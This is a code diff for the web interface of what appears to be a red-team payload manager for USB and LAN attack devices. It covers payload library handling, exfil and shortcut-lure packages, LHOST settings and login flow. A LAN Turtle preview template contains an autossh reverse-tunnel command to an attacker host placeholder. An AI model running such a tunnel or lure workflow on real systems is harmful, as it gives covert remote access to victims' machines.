+  display:flex;flex-wrap:wrap;gap:6px;
+  margin-bottom:12px;
+  justify-content:center;
 }
-.about-github-link{
-  display:inline-block;margin-top:10px;font-size:14px;color:var(--cyan);
-  text-decoration:none;letter-spacing:0.5px;
+.about-device-chip{
+  font-family:var(--display);
+  font-size:10px;
+  letter-spacing:1px;
+  padding:4px 8px;
+  border-radius:3px;
+  border:1px solid var(--border-bright);
+  color:var(--text-bright);
+  background:color-mix(in srgb, var(--bg2) 80%, transparent);
 }
-.about-meta-line{
-  font-size:13px;color:var(--text);margin-top:12px;line-height:1.45;
+.about-device-chip.muted{
+  color:var(--text);
+  border-style:dashed;
+  opacity:0.85;
 }
-.about-github-link:hover{text-decoration:underline;}
+.about-meta-row{
+  display:flex;flex-wrap:wrap;gap:8px;align-items:center;
+  justify-content:center;
+  padding-top:10px;
+  border-top:1px solid var(--border);
+}
+.about-meta-pill{
+  font-family:var(--display);
+  font-size:10px;
+  letter-spacing:1.5px;
+  color:var(--text);
+  padding:3px 8px;
+  border-radius:3px;
+  background:var(--bg2);
+  border:1px solid var(--border);
+}
+.about-meta-pill.accent{
+  color:var(--red);
+  border-color:color-mix(in srgb, var(--red) 40%, var(--border));
+}
+.about-qr-section{
+  margin:4px 0 18px;
+}
+.about-qr-section-title{
+  font-family:var(--display);
+  font-size:10px;
+  letter-spacing:3px;
+  color:var(--text);
+  text-align:center;
+  margin-bottom:14px;
+}
 .about-qr-row{
-  display:flex;gap:48px;justify-content:center;align-items:flex-start;
-  margin:22px 0 20px;flex-wrap:nowrap;
+  display:flex;gap:40px;justify-content:center;align-items:flex-start;
+  flex-wrap:wrap;
 }
 .about-qr-cell{
   flex:0 0 auto;text-align:center;
+  min-width:140px;
 }
 .about-qr-cell img{
-  border:1px solid var(--border-bright);border-radius:4px;padding:4px;
+  border:1px solid var(--border-bright);border-radius:6px;padding:6px;
   background:#fff;display:block;margin:0 auto;
+  transition:box-shadow 0.15s;
+}
+.about-qr-cell a:hover img{
+  box-shadow:0 0 16px rgba(0,229,255,0.25);
 }
 .about-qr-label{
-  font-family:var(--display);font-size:13px;color:var(--text);margin-top:10px;letter-spacing:2px;
+  font-family:var(--display);font-size:11px;color:var(--red);
+  margin-top:10px;letter-spacing:2px;font-weight:700;
 }
 .about-qr-url{
-  font-size:14px;font-weight:600;color:var(--cyan);margin-top:8px;
-  line-height:1.45;white-space:nowrap;display:inline-block;
+  font-size:12px;font-weight:500;color:var(--cyan);margin-top:6px;
+  line-height:1.4;display:inline-block;max-width:200px;
+  word-break:break-all;
   text-decoration:none;letter-spacing:0.2px;
+  font-family:var(--mono);
 }
 .about-qr-url:hover{text-decoration:underline;}
 .about-kofi-banner{
@@ -1507,11 +1677,12 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
 .about-kofi-link:hover{text-decoration:underline;}
 .about-footer-tag{
   margin-top:22px;padding-top:18px;border-top:1px solid var(--border);
-  text-align:center;font-size:13px;color:var(--text);letter-spacing:2px;
+  text-align:center;font-size:12px;color:var(--text);letter-spacing:2px;
 }
 @media (max-width:640px){
-  .about-qr-row{gap:24px;overflow-x:auto;padding-bottom:4px;}
-  .about-qr-url{font-size:15px;}
+  .about-qr-row{gap:24px;}
+  .about-qr-url{font-size:11px;}
+  .about-lead{white-space:normal;font-size:12px;}
 }
 
 /* ── SYSTEM MODALS (CONFIG / ABOUT / HELP / REPOS / OPERATOR / SNARF) ─ */
@@ -1559,19 +1730,25 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
   flex:1;
   font-size:15px;line-height:1.55;color:var(--text-bright);
 }
+#snarf-overlay.sys-overlay{padding:10px 14px;}
 #snarf-overlay .sys-modal{
-  width:min(1040px,96vw);
-  height:min(90vh,860px);
-  max-height:min(90vh,860px);
+  width:min(1080px,96vw);
+  height:min(96vh,980px);
+  max-height:min(96vh,980px);
 }
 #snarf-overlay .sys-modal-title{font-size:13px;letter-spacing:3px;}
 #snarf-overlay .sys-modal-close{font-size:13px;padding:9px 14px;}
 #snarf-modal-body{
-  padding:20px 24px 24px;
+  padding:18px 22px 20px;
   display:flex;flex-direction:column;
-  overflow-y:auto;
+  flex:1;min-height:0;
+  overflow-x:hidden;overflow-y:auto;
   font-size:15px;line-height:1.55;
+  scrollbar-gutter:stable;
 }
+#snarf-modal-body::-webkit-scrollbar{width:8px;}
+#snarf-modal-body::-webkit-scrollbar-thumb{background:var(--border-bright);border-radius:4px;}
+#snarf-modal-body::-webkit-scrollbar-track{background:rgba(0,0,0,0.2);}
 #snarf-modal-body code{font-family:var(--mono);font-size:13px;}
 .help-k{color:var(--yellow);}
 .help-flow-step{
@@ -1631,6 +1808,12 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
   letter-spacing:1.5px;color:var(--yellow);
   overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
 }
+#editor-filename-input{
+  font-family:var(--mono);font-size:13px;color:var(--yellow);
+  background:var(--bg2);border:1px solid var(--border-bright);border-radius:3px;
+  padding:3px 8px;min-width:160px;max-width:340px;
+}
+#editor-filename-input:focus{outline:none;border-color:var(--cyan);}
 #editor-device-badge{
   font-size:11px;padding:4px 10px;border-radius:3px;
   font-family:var(--display);letter-spacing:1px;flex-shrink:0;
@@ -1670,12 +1853,12 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
 }
 #editor-gutter{
   width:52px;flex-shrink:0;
-  background:#050510;
+  background:var(--bg2);
   border-right:1px solid var(--border);
   padding:12px 0;
   overflow:hidden;
   font-size:13px;line-height:var(--ed-lh);
-  color:#5a5a7a;text-align:right;
+  color:var(--preview-comment);text-align:right;
   padding-right:10px;
   font-family:var(--mono);
   user-select:none;
@@ -1721,15 +1904,15 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
 }
 .evp-none{
   margin-top:8px;padding-top:8px;
-  border-top:1px solid #1a1a2e;
-  color:#6a6a82;font-size:12px;font-style:italic;
+  border-top:1px solid var(--border);
+  color:var(--text);font-size:12px;font-style:italic;opacity:0.88;
 }
 #editor-textarea{
   flex:1;
-  background:#030308;
+  background:var(--bg);
   border:none;outline:none;resize:none;
   font-family:var(--mono);font-size:var(--ed-font);
-  line-height:var(--ed-lh);color:#d8d8d8;
+  line-height:var(--ed-lh);color:var(--preview-text);
   padding:12px 16px;
   caret-color:var(--green);
   tab-size:4;
@@ -1832,8 +2015,9 @@ body[data-theme="light"] #btn-flash:disabled{background:#ddd;color:#aaa;}
 
 /* Config inputs - make placeholder obviously placeholder */
 .config-input::placeholder {
-  color: #5a5a7a;
+  color: var(--preview-comment);
   font-style: italic;
+  opacity: 0.92;
 }
 .config-input:focus {
   border-color: var(--red-dim) !important;
@@ -1995,7 +2179,7 @@ body.presentation-mode .ed-btn{font-size:13px;padding:11px 24px;}
 /* Terminal log panel */
 #term-panel{
   display:none;position:fixed;bottom:46px;right:20px;
-  width:520px;z-index:300;
+  width:520px;z-index:520;
   border-radius:6px;overflow:hidden;
   box-shadow:0 0 40px rgba(0,0,0,0.8), 0 0 0 1px var(--border-bright);
 }
@@ -2036,7 +2220,7 @@ body.presentation-mode .ed-btn{font-size:13px;padding:11px 24px;}
 
 /* Repo status badges */
 .repo-cloned{color:var(--green);font-size:13px;letter-spacing:1px;}
-.repo-missing{color:#6a6a8a;font-size:13px;letter-spacing:1px;}
+.repo-missing{color:var(--text);font-size:13px;letter-spacing:1px;}
 .repo-item{padding:14px 0;border-bottom:1px solid var(--border);}
 .repo-header{display:flex;align-items:center;flex-wrap:wrap;gap:10px 14px;margin-bottom:10px;}
 .repo-name{font-family:var(--display);font-size:14px;letter-spacing:2px;font-weight:700;}
@@ -2118,6 +2302,7 @@ body.presentation-mode .ed-btn{font-size:13px;padding:11px 24px;}
 
       <!-- Register -->
       <div id="register-form" style="display:none">
+        <div id="reg-hint" style="display:none;margin-bottom:10px;font-size:11px;color:var(--text);line-height:1.5;padding:8px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:3px;">No operators registered. Create the first account to access the system.</div>
         <div class="login-field">
           <label class="login-label">CHOOSE USERNAME</label>
           <input class="login-input" id="reg-username" type="text"
@@ -2134,7 +2319,6 @@ body.presentation-mode .ed-btn{font-size:13px;padding:11px 24px;}
             placeholder="••••••••"
             onkeydown="registerKey(event)">
         </div>
-        <div id="reg-hint" style="display:none;margin-bottom:10px;font-size:11px;color:var(--text);line-height:1.5;padding:8px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:3px;">No operators registered. Create the first account to access the system.</div>
         <button id="reg-btn" onclick="doRegister()" style="margin-top:4px;width:100%;padding:10px;font-family:var(--display);font-size:11px;letter-spacing:3px;background:var(--accent);color:var(--accent-fg);font-weight:700;border:none;border-radius:3px;cursor:pointer;">CREATE OPERATOR</button>
         <div id="reg-error" style="margin-top:12px;padding:8px 12px;background:rgba(255,26,26,0.08);border:1px solid var(--red-dim);border-radius:3px;font-size:11px;color:var(--red);display:none;text-align:center;"></div>
       </div>
@@ -2302,11 +2486,11 @@ body.presentation-mode .ed-btn{font-size:13px;padding:11px 24px;}
               <div class="cfg-title">PAYLOADS</div>
               <span id="center-source">○ PREVIEW</span>
               <span id="center-payload-count" class="center-payload-badge is-hidden" title="Payloads for this device"></span>
-              <button type="button" id="btn-new-payload" class="browse-new-payload-btn" onclick="createNewPayload()" title="Create a new payload in MY PAYLOADS">+ NEW</button>
-              <button type="button" id="btn-snarf" class="snarf-header-btn" onclick="showSnarf()" style="display:none" title="SNARF builder (S)">SNARF</button>
-              <button type="button" id="lhost-chip" class="unset" onclick="showConfig()" title="Open CONFIG to set LHOST and LPORT">LHOST not set</button>
+              <button type="button" id="btn-new-payload" class="browse-new-payload-btn browse-header-ctl" onclick="createNewPayload()" title="Create a new payload in MY PAYLOADS">+ NEW</button>
+              <button type="button" id="btn-snarf" class="snarf-header-btn browse-header-ctl" onclick="showSnarf()" style="display:none" title="SNARF builder (S)">SNARF</button>
+              <button type="button" id="lhost-chip" class="lhost-header-chip browse-header-ctl unset" onclick="showConfig()" title="Open CONFIG to set LHOST and LPORT">LHOST not set</button>
             </div>
-            <div id="search-wrap">
+            <div id="search-wrap" class="browse-header-ctl">
               <span class="search-icon">⌕</span>
               <input id="search-input" type="text" placeholder="search payloads..." autocomplete="off">
             </div>
@@ -2517,6 +2701,7 @@ body.presentation-mode .ed-btn{font-size:13px;padding:11px 24px;}
       <div id="editor-title-left">
         <span id="editor-icon">✎</span>
         <span id="editor-filename">untitled</span>
+        <input id="editor-filename-input" type="text" class="editor-filename-input" style="display:none" spellcheck="false" autocomplete="off" oninput="onEditorFilenameInput()">
         <span id="editor-device-badge">DS1</span>
         <span id="editor-modified">● MODIFIED</span>
       </div>
@@ -2605,7 +2790,6 @@ const S = {
   lastSnarfCatch: null,
   defcon34: false,
   presentationMode: false,
-  demoMode: false,
   music: { tracks: [], index: 0, loaded: false },
 };
 
@@ -2746,22 +2930,45 @@ async function refreshLoginOperators() {
     usernameWrap.style.display = 'none';
     if (regHint) regHint.style.display = 'none';
     document.getElementById('login-screen')?.setAttribute('data-operator-mode', 'select');
+    const tabLogin = document.getElementById('tab-login');
+    const tabChangepw = document.getElementById('tab-changepw');
+    if (tabLogin) tabLogin.style.display = '';
+    if (tabChangepw) tabChangepw.style.display = '';
     switchLoginTab('login');
     setTimeout(() => document.getElementById('login-password')?.focus(), 100);
     return true;
   }
 
+  localStorage.removeItem('tsk_last_user');
   selectWrap.style.display = 'none';
   usernameWrap.style.display = 'block';
-  txt.value = lastUser;
+  txt.value = '';
+  const regUser = document.getElementById('reg-username');
+  const regPw = document.getElementById('reg-password');
+  const regConfirm = document.getElementById('reg-confirm');
+  if (regUser) regUser.value = '';
+  if (regPw) regPw.value = '';
+  if (regConfirm) regConfirm.value = '';
   if (regHint) regHint.style.display = 'block';
   document.getElementById('login-screen')?.setAttribute('data-operator-mode', 'type');
+  const tabLogin = document.getElementById('tab-login');
+  const tabChangepw = document.getElementById('tab-changepw');
+  if (tabLogin) tabLogin.style.display = 'none';
+  if (tabChangepw) tabChangepw.style.display = 'none';
   switchLoginTab('register');
   return false;
 }
 
 async function showLogin() {
   document.getElementById('login-screen').classList.add('visible');
+  const loginBtn = document.getElementById('login-btn');
+  if (loginBtn) {
+    loginBtn.disabled = false;
+    loginBtn.textContent = 'ACCESS SYSTEM';
+    loginBtn.style.background = '';
+    loginBtn.style.color = '';
+    loginBtn.style.boxShadow = '';
+  }
   setTimeout(() => {
     requestAnimationFrame(() => startLoginLogoGlitch());
   }, 1050);
@@ -2925,8 +3132,12 @@ async function doDeleteOperator() {
       S.currentUser = null;
       S.authToken = '';
       sessionStorage.removeItem('tsk_token');
+      localStorage.removeItem('tsk_last_user');
       hideDeleteConfirm();
       document.getElementById('del-password').value = '';
+      closeAllOverlays();
+      resetOperatorTab();
+      document.getElementById('app').classList.remove('visible');
       await showLogin();
     } else {
       hideDeleteConfirm();
@@ -2973,6 +3184,8 @@ async function doLogin() {
       sessionStorage.setItem('tsk_token', S.authToken);
       document.getElementById('login-screen').classList.remove('visible');
       stopLoginLogoGlitch();
+      closeAllOverlays();
+      resetOperatorTab();
       // Reload fresh config from server to get latest saved values (lhost etc)
       try {
         const cfgR = await fetch('/api/config');
@@ -2980,7 +3193,9 @@ async function doLogin() {
         freshCfg._user = username;
         applyConfig(freshCfg);
       } catch(e) {
-        applyConfig(data.config);
+        const cfg = data.config || {};
+        cfg._user = username;
+        applyConfig(cfg);
       }
       init();
     } else {
@@ -3059,8 +3274,19 @@ async function doRegister() {
       sessionStorage.setItem('tsk_token', S.authToken);
       document.getElementById('login-screen').classList.remove('visible');
       stopLoginLogoGlitch();
-      // Apply full config from server - includes all saved values like lhost
-      applyConfig(data.config);
+      closeAllOverlays();
+      resetOperatorTab();
+      // Reload fresh config from server - includes all saved values like lhost
+      try {
+        const cfgR = await fetch('/api/config');
+        const freshCfg = await cfgR.json();
+        freshCfg._user = username;
+        applyConfig(freshCfg);
+      } catch(e) {
+        const cfg = data.config || {};
+        cfg._user = username;
+        applyConfig(cfg);
+      }
       init();
     } else {
       showRegError(data.error || 'Registration failed');
@@ -3150,7 +3376,7 @@ async function boot() {
 async function init() {
   startClock();
   connectWS();
-  refreshUsbMounts();
+  startDevicePolling();
   // Show app
   document.getElementById('app').classList.add('visible');
   if (typeof window._tskInitPanelWidth === 'function') {
@@ -3171,6 +3397,35 @@ async function init() {
 
 // ── CLOCK ─────────────────────────────────────────────────────────────────────
 let _clockTimer = null;
+let _devicePollTimer = null;
+
+async function pollAllDevices() {
+  if (!S.authToken && !sessionStorage.getItem('tsk_token')) return;
+  try {
+    const [devR, usbR] = await Promise.all([
+      fetch('/api/devices'),
+      fetch('/api/usb/mounts'),
+    ]);
+    if (devR.ok) updateDevices(await devR.json());
+    if (usbR.ok) {
+      const data = await usbR.json();
+      updateUsbSticks(data.mounts || [], false);
+    }
+  } catch (e) { /* ignore */ }
+}
+
+function startDevicePolling() {
+  if (_devicePollTimer) clearInterval(_devicePollTimer);
+  pollAllDevices();
+  _devicePollTimer = setInterval(pollAllDevices, 5000);
+}
+
+function stopDevicePolling() {
+  if (_devicePollTimer) {
+    clearInterval(_devicePollTimer);
+    _devicePollTimer = null;
+  }
+}
 
 function formatClockTime(date) {
   const use24 = S.config?.clock_24h !== false;
@@ -3199,6 +3454,10 @@ function startClock() {
 
 // ── WEBSOCKET ─────────────────────────────────────────────────────────────────
 function connectWS() {
+  if (S.ws) {
+    S.ws.onclose = null;
+    try { S.ws.close(); } catch (e) { /* ignore */ }
+  }
   const token = S.authToken || sessionStorage.getItem('tsk_token') || '';
   const _wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
   S.ws = new WebSocket(`${_wsProto}//${location.host}/ws?token=${encodeURIComponent(token)}`);
@@ -3272,10 +3531,16 @@ function applyConfig(cfg) {
 
   // If config modal is open, refresh it so values show
   if (S.openOverlay === 'config') renderConfigTab();
+  if (S.openOverlay === 'operator') renderOperatorTab();
   updateArmedState();
   updateFlashPreview();
   updateLhostHint();
   updateLhostChip();
+  if (S.openOverlay === 'snarf' && _snarfMode === 'catch') {
+    const bar = document.getElementById('snarf-endpoint-bar');
+    if (bar) bar.outerHTML = snarfEndpointBarHtml();
+    renderSnarfCatchFeed();
+  }
 }
 
 function dismissLhostHint() {
@@ -3433,6 +3698,14 @@ function closeAllOverlays() {
   S.openOverlay = null;
 }
 
+function resetOperatorTab() {
+  const opBody = document.getElementById('operator-modal-body');
+  if (opBody) {
+    opBody.innerHTML = '';
+    delete opBody.dataset.opUser;
+  }
+}
+
 function restoreDeviceNavHighlight() {
   document.querySelectorAll('.sys-tile, .dev-card').forEach(el => el.classList.remove('active'));
   const deviceNav = document.querySelector(`[data-nav="${S.device}"]`);
@@ -3496,6 +3769,7 @@ function operatorOverlayClick(e) {
 function showSnarf() {
   if (S.device !== 'usb') return;
   closeAllOverlays();
+  invalidateSnarfBuild();
   renderSnarfPanel();
   document.getElementById('snarf-overlay')?.classList.add('visible');
   S.openOverlay = 'snarf';
@@ -3573,7 +3847,7 @@ async function navigate(target) {
     const usbStick = document.getElementById('usb-stick-wrap');
     if (usbDeploy) usbDeploy.style.display = target === 'usb' ? 'flex' : 'none';
     if (usbStick) usbStick.style.display = target === 'usb' ? 'flex' : 'none';
-    if (target === 'usb') refreshUsbMounts();
+    if (target === 'usb') await refreshUsbMounts();
     await loadDevicePayloads(target);
     updateLhostHint();
     updateSidebarHighlight();
@@ -3611,12 +3885,12 @@ function updateActionButtons() {
   if (!flash || !edit || !save) return;
 
   const p = S.selectedPayload || S.payload;
+  const hasSelection = !!(p && (p.path || p.name || p.file));
   const hasPath = !!(p && p.path);
-  const enabled = hasPath;
 
-  flash.disabled = !enabled;
-  edit.disabled = !enabled;
-  save.disabled = !enabled;
+  flash.disabled = !hasPath;
+  edit.disabled = !hasSelection;
+  save.disabled = !hasSelection;
 }
 
 // ── PAYLOADS ──────────────────────────────────────────────────────────────────
@@ -3650,9 +3924,8 @@ async function createNewPayload() {
       toast(data.error || 'Create failed', 'err');
       return;
     }
+    queuePayloadSelection({ path: data.payload.path });
     await loadDevicePayloads(S.device);
-    const idx = _flatPayloads.findIndex(p => p.path === data.payload.path);
-    if (idx >= 0) selectPayload(idx);
     toast('Created in MY PAYLOADS', 'ok');
   } catch (e) {
     toast(`Create failed: ${e}`, 'err');
@@ -3664,7 +3937,34 @@ async function deleteUserPayload(e, idx) {
   e.preventDefault();
   const p = _flatPayloads[idx];
   if (!p || !isUserPayload(p)) return;
-  if (!confirm(`Delete "${p.name}" from MY PAYLOADS?`)) return;
+  if (p.cat === 'LURES') {
+    if (!p.package_id) {
+      toast('Re-save from SNARF → LURE with a package name, or delete legacy files manually', 'warn');
+      return;
+    }
+    if (!confirm(`Delete lure package "${p.name}" and all bundled files?`)) return;
+    try {
+      const r = await fetch('/api/dropper/lure/delete-package', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ package_id: p.package_id }),
+      });
+      const data = await r.json();
+      if (!r.ok || !data.ok) {
+        toast(data.error || 'Delete failed', 'err');
+        return;
+      }
+      S.payload = null;
+      S.selectedPayload = null;
+      invalidateLureOptions();
+      await loadDevicePayloads(S.device);
+      toast('Lure package deleted', 'ok');
+    } catch (err) {
+      toast(`Delete failed: ${err}`, 'err');
+    }
+    return;
+  }
+  if (!confirm(`Delete "${p.name}" from your library?`)) return;
   try {
     const r = await fetch('/api/payload/delete', {
       method: 'POST',
@@ -3678,6 +3978,8 @@ async function deleteUserPayload(e, idx) {
     }
     S.payload = null;
     S.selectedPayload = null;
+    invalidateLureOptions();
+    invalidateSnarfBuild();
     await loadDevicePayloads(S.device);
     toast('Payload deleted', 'ok');
   } catch (err) {
@@ -3685,7 +3987,120 @@ async function deleteUserPayload(e, idx) {
   }
 }
 
+async function renameUserPayload(e, idx) {
+  e.stopPropagation();
+  e.preventDefault();
+  const p = _flatPayloads[idx];
+  if (!p || !isUserPayload(p)) return;
+  if (p.cat === 'LURES') {
+    if (!p.package_id) {
+      toast('Re-save this lure from SNARF → LURE with a package name', 'warn');
+      return;
+    }
+    const newName = prompt(`Rename lure package:`, p.name);
+    if (!newName || !newName.trim()) return;
+    try {
+      const r = await fetch('/api/dropper/lure/rename', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ package_id: p.package_id, name: newName.trim() }),
+      });
+      const data = await r.json();
+      if (!r.ok || !data.ok) {
+        toast(data.error || 'Rename failed', 'err');
+        return;
+      }
+      await loadDevicePayloads(S.device);
+      const newIdx = _flatPayloads.findIndex(x => x.package_id === data.payload.package_id);
+      if (newIdx >= 0) selectPayload(newIdx);
+      toast(`Renamed lure package to ${data.payload.name}`, 'ok');
+    } catch (err) {
+      toast(`Rename failed: ${err}`, 'err');
+    }
+    return;
+  }
+  if (p.path && p.path.replace(/\\/g, '/').includes('/packages/')) {
+    toast('Lure files cannot be renamed here - use REN on the LURES row', 'warn');
+    return;
+  }
+  const ext = (p.file || '').includes('.') ? p.file.slice(p.file.lastIndexOf('.')) : '';
+  const stem = ext ? (p.file || '').slice(0, -ext.length) : (p.file || p.name || '');
+  const newName = prompt(`Rename payload (filename without path):`, stem);
+  if (!newName || !newName.trim()) return;
+  try {
+    const r = await fetch('/api/payload/rename', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ path: p.path, name: newName.trim() }),
+    });
+    const data = await r.json();
+    if (!r.ok || !data.ok) {
+      toast(data.error || 'Rename failed', 'err');
+      return;
+    }
+    invalidateLureOptions();
+    await loadDevicePayloads(S.device);
+    const newIdx = _flatPayloads.findIndex(x => x.path === data.payload.path);
+    if (newIdx >= 0) selectPayload(newIdx);
+    toast(`Renamed to ${data.payload.file}`, 'ok');
+  } catch (err) {
+    toast(`Rename failed: ${err}`, 'err');
+  }
+}
+
+let _pendingPayloadSelect = null;
+
+function queuePayloadSelection(ref) {
+  if (ref) _pendingPayloadSelect = ref;
+}
+
+function resolvePayloadIndex(ref) {
+  if (!ref) return -1;
+  if (ref.package_id) {
+    const pid = String(ref.package_id).toLowerCase();
+    const idx = _flatPayloads.findIndex(p => (p.package_id || '').toLowerCase() === pid);
+    if (idx >= 0) return idx;
+  }
+  if (ref.path) {
+    const norm = String(ref.path).replace(/\\/g, '/');
+    const idx = _flatPayloads.findIndex(p => (p.path || '').replace(/\\/g, '/') === norm);
+    if (idx >= 0) return idx;
+  }
+  if (ref.file) {
+    const base = String(ref.file).replace(/\\/g, '/').split('/').pop().toLowerCase();
+    const idx = _flatPayloads.findIndex(p => {
+      const f = (p.file || '').toLowerCase();
+      if (f === base) return true;
+      const pathBase = (p.path || '').replace(/\\/g, '/').split('/').pop().toLowerCase();
+      return pathBase === base;
+    });
+    if (idx >= 0) return idx;
+  }
+  if (ref.name && ref.cat) {
+    const idx = _flatPayloads.findIndex(p =>
+      (p.name || '') === ref.name && (p.cat || '') === ref.cat && p.path
+    );
+    if (idx >= 0) return idx;
+  }
+  return -1;
+}
+
+async function applyPendingPayloadSelection() {
+  const ref = _pendingPayloadSelect;
+  _pendingPayloadSelect = null;
+  if (!ref) return false;
+  const idx = resolvePayloadIndex(ref);
+  if (idx < 0) return false;
+  await selectPayload(idx);
+  document.querySelector(`.p-item[data-idx="${idx}"]`)?.scrollIntoView({ block: 'nearest' });
+  return true;
+}
+
 async function loadDevicePayloads(device) {
+  const keepPrev = !_pendingPayloadSelect;
+  const prevKey = keepPrev
+    ? (S.selectedPayloadKey || (S.selectedPayload && payloadItemKey(S.selectedPayload)))
+    : '';
   const r = await fetch(`/api/payloads/${device}?username=${encodeURIComponent(S.currentUser || '')}`);
   const data = await r.json();
   S.payloads[device] = data.groups || [];
@@ -3698,6 +4113,8 @@ async function loadDevicePayloads(device) {
   updateTotalCount();
   if (device === S.device) {
     renderPayloads(S.payloads[device]);
+    const picked = await applyPendingPayloadSelection();
+    if (!picked) syncPayloadSelectionAfterReload(prevKey);
     if (device !== 'usb') updateSourceIndicator(device);
     updatePayloadCountDisplay();
   }
@@ -3800,9 +4217,21 @@ function applyPayloadListSelection() {
   });
 }
 
+const USB_PAYLOAD_CAT_ORDER = ['BUILT-INS', 'EXFILS', 'LURES', 'MY PAYLOADS'];
+
+function sortUsbPayloadGroups(groups) {
+  const order = Object.fromEntries(USB_PAYLOAD_CAT_ORDER.map((c, i) => [c, i]));
+  return [...groups].sort((a, b) => {
+    const ia = order[a.cat] ?? 50;
+    const ib = order[b.cat] ?? 50;
+    return ia - ib || String(a.cat).localeCompare(String(b.cat));
+  });
+}
+
 function renderPayloads(groups) {
   const list = document.getElementById('payload-list');
   _flatPayloads = [];
+  if (S.device === 'usb' && groups?.length) groups = sortUsbPayloadGroups(groups);
   const color  = getDeviceColor(S.device) || '#fff';
   const isReal = (S.repoExists || {})[S.device];
   let html = '';
@@ -3825,20 +4254,54 @@ function renderPayloads(groups) {
       const tags = (p.tags||[]).map(t =>
         `<span class="tag tag-${t}">${t}</span>`).join('');
       const sel = payloadItemClasses(p);
-      const delBtn = isUserPayload(p)
-        ? `<button type="button" class="p-item-delete" onclick="deleteUserPayload(event,${n})" title="Delete from MY PAYLOADS">DEL</button>`
+      const userBtns = isUserPayload(p)
+        ? `<button type="button" class="p-item-rename" onclick="renameUserPayload(event,${n})" title="Rename payload file">REN</button>`
+          + `<button type="button" class="p-item-delete" onclick="deleteUserPayload(event,${n})" title="Delete from MY PAYLOADS">DEL</button>`
         : '';
+      const lureHint = (p.cat === 'LURES' && p.file)
+        ? `<span class="p-lure-victim">→ ${p.file}</span>` : '';
       html += `<div class="p-item${sel ? ' ' + sel : ''}" onclick="selectPayload(${n})" data-idx="${n}">
         <span class="p-num">#${String(n+1).padStart(2,'0')}</span>
         <div class="p-icon" style="color:${color}"></div>
-        <span class="p-name">${p.name}</span>
+        <span class="p-name">${p.name}${lureHint}</span>
         <div class="p-tags">${tags}</div>
         <span class="p-lang">${p.lang||''}</span>
-        ${delBtn}
+        ${userBtns}
       </div>`;
     }
   }
   list.innerHTML = html || '<div class="cfg-hint" style="padding:20px">No payloads found.</div>';
+}
+
+/** After payload list reload, re-bind selection to new _flatPayloads entries (with real paths). */
+function syncPayloadSelectionAfterReload(prevKey) {
+  const key = prevKey || S.selectedPayloadKey || (S.selectedPayload && payloadItemKey(S.selectedPayload));
+  const prevName = S.selectedPayload?.name;
+
+  let idx = key ? _flatPayloads.findIndex(p => payloadItemKey(p) === key && p.path) : -1;
+  if (idx < 0 && key) {
+    idx = _flatPayloads.findIndex(p => payloadItemKey(p) === key);
+  }
+  if (idx < 0 && prevName) {
+    idx = _flatPayloads.findIndex(p => p.name === prevName && p.path);
+  }
+
+  if (idx >= 0) {
+    selectPayload(idx);
+    return;
+  }
+
+  S.payload = null;
+  S.selectedPayload = null;
+  S.selectedPayloadKey = '';
+  S.selectedSetKey = '';
+  document.getElementById('right')?.classList.remove('payload-active');
+  document.getElementById('preview-code').innerHTML = '';
+  document.getElementById('preview-title').textContent = 'PREVIEW';
+  document.getElementById('preview-file').textContent = '';
+  syncPreviewEmptyHint();
+  updateActionButtons();
+  updateArmedState();
 }
 
 async function selectPayload(idx) {
@@ -3867,6 +4330,7 @@ async function selectPayload(idx) {
 
   // Load real file content async (preview only)
   let code = '';
+  let previewLang = p.lang;
   if (p.path) {
     try {
       const r = await fetch('/api/payload/preview', {
@@ -3875,11 +4339,16 @@ async function selectPayload(idx) {
         body: JSON.stringify({path: p.path})
       });
       const data = await r.json();
-      code = data.content || '';
+      if (data.binary) {
+        code = formatBinaryPreview(p, data);
+        previewLang = 'LNK';
+      } else {
+        code = data.content || '';
+      }
     } catch(e) {}
   }
   if (!code) code = getPreviewTemplate(p);
-  document.getElementById('preview-code').innerHTML = highlightCode(code, p.lang);
+  document.getElementById('preview-code').innerHTML = highlightCode(code, previewLang);
   updateFlashPreview();
   saveSessionState();
 }
@@ -3891,8 +4360,34 @@ function getPreviewTemplate(p) {
     LT:  `#!/bin/sh\n# ${p.name}\n# LAN Turtle Module\nautossh -M 0 -N \\\n  -R 2222:localhost:22 \\\n  user@LHOST -p 443 &`,
     ARD: `// ${p.name}\n#include "Keyboard.h"\nvoid setup() {\n  delay(500);\n  Keyboard.begin();\n  // payload logic\n  Keyboard.end();\n}\nvoid loop() {}`,
     PY:  `#!/usr/bin/env python3\n# ${p.name}\nimport os, shutil\nfrom pathlib import Path\n\n# payload logic here`,
+    LNK: `# ${p.file || p.name}\n# Windows shortcut (binary)\n# Use FLASH to deploy with companion payload script`,
   };
   return templates[p.lang] || `# ${p.name}\n# No preview available`;
+}
+
+function isBinaryPayload(payload) {
+  if (!payload) return false;
+  if (payload.lang === 'LNK') return true;
+  return /\.lnk$/i.test(payload.file || '');
+}
+
+function formatBinaryPreview(payload, data) {
+  const name = payload.file || payload.name || 'shortcut';
+  const type = data.binary_type || payload.lang || 'BIN';
+  const size = data.size != null ? `${data.size.toLocaleString()} bytes` : 'unknown size';
+  const lines = [
+    `# ${name} (${type} · ${size})`,
+    '#',
+    '# Windows shortcut - binary file, not a text script.',
+    '# FLASH copies it verbatim and deploys companion scripts in the package.',
+    '# Edit the companion .ps1 in MY PAYLOADS / EXFILS, or rebuild in SNARF → LURE.',
+  ];
+  const strings = data.strings_preview || [];
+  if (strings.length) {
+    lines.push('#', '# Embedded strings (preview):');
+    strings.forEach(s => lines.push(`#   ${s}`));
+  }
+  return lines.join('\n');
 }
 
 function highlightCode(code, lang) {
@@ -3919,6 +4414,9 @@ function highlightCode(code, lang) {
